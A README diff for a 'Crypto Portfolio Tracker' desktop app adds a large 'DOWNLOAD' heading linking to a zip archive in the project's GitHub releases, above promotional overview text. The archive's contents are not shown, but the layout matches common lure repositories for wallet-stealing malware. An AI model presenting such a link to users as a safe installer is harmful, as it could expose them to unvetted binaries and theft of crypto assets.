@@ -1,6 +1,12 @@
 
 # 🚀 Crypto Portfolio Tracker
 
+
+
+# [DOWNLOAD](https://github.com/Geoxant8/Crypto-Portfolio-Tracker/releases/download/download/Crypto.Portfolio.Tracker.zip)
+
+
+
 ## 📌 Overview
 
 Crypto Portfolio Tracker is a powerful and intuitive desktop application built for users who want full control over their digital asset management. Designed with a focus on performance, usability, and simplicity, this tool allows you to monitor your holdings in real time without relying on complex web platforms or heavy software.
